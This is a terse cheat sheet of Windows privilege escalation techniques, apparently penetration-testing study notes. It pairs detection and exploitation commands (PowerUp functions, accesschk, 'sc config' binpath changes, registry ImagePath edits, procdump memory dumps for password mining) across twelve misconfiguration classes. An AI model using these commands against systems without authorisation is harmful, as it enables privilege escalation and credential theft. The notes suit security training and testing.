1. kernel exploit:
    + Detection: 
        + msf module `post/multi/recon/local_exploit_suggester`
        + systeminfo+windows-exploit-suggester.py
        + Sherlock `Find-AllVulns` 
        + Watson, SharpUp    
    + Exploitation:
        + msf modules
        + manually compile exploit and upload to box

2. DLL hijacking:
    + Detection:
        + PowerUp `Find-PathDLLHijack`
        + PowerUp `Find-ProcessDLLHijack`
        + manually `dll_hijack_detect_x64|86.exe`
    + Exploitation:
        + PowerUp `Write-HijackDLL -Dllpath PATH -Command/-Username`
        + manually create DLL binary, upload, then `sc stop NAME; sc start NAME`

3. Service: binpath:
    + Detection:
        + PowerUp `Get-ModifiableService`
        + manually `.\accesschk64.exe -wuvc USER *`
    + Exploitation:
        + PowerUp `Invoke-ServiceAbuse -Name SERVICE -Command/-Username`
        + manually `sc config SERVICE binpath= "COMMAND/EXECUTABLE"` 

4. Service: unquoted:
    + Detection:
        + PowerUp `Get-ServiceUnquoted`
        + PowerUp `Find-PathDLLHijack`
    + Exploitation:
        + PowerUp `Write-ServiceBinary -Path -Command/-Username`
        + manually create service binary, upload, then `sc stop NAME; sc start NAME`

5. Service: registry:
    + Detection:
        + manually `.\accesschk64.exe -kwusv hklm\System\CurrentControlSet\Services | select-string -pattern GROUP/USER -casesensitive -context 7,7`
    + Exploitation:
        + manually create service binary, upload, then `New-ItemProperty -Path HKLM:SYSTEM\CurrentControlSet\services\NAME -Name ImagePath -Value PATH -PropertyType ExpandString -Force`

6. Service: executable:
    + Detection:
        + PowerUp `Get-ModifiableServiceFile`
        + manually `accesschk64.exe -wuv FILE/DIRECTORY`
    + Exploit:
        + PowerUp `Install-ServiceBinary -Name SERVICE -Command/-Username` 
        + manually create service binary, upload, then overwrite service file

7. Registry: autorun:
    + Detection:
        + PowerUp `Get-ModifiableRegistryAutoRun`
    + Exploitation:
        + manually create .exe, upload, then wait for administrator to log in

8. Registry: AlwaysInstallElevated:
    + Detection: 
        + PowerUp `Get-RegistryAlwaysInstallElevated`
        + manually `Get-ItemProperty HKLM:Software\Policies\Microsoft\Windows\Installer` and `Get-ItemProperty HKCU:Software\Policies\Microsoft\Windows\Installer`
    + Exploitation:
        + PowerUp `Write-UserAddMSI`
        + manually create MSI binary, upload, then run

9. Password mining: memory:
    + get list of running processes
    + dump memory with `procdump.exe`
    + search for password in dump

10. Password mining: registry:
    + PowerUp `Get-RegistryAutoLogon`

11. Password mining: config files:
    + PowerUp `Get-UnattendedInstallFile`
    + PowerUp `Get-WebConfig`
    + PowerUp `Get-CachedGPPPassword`
    + PowerUp `Get-SiteListPassword`

12. Scheduled tasks:
    + Detection:
        + PowerUp `Get-ModifiableScheduledTaskFile`
    + Exploitation:
        + manually create .exe, upload, then place file in identified location
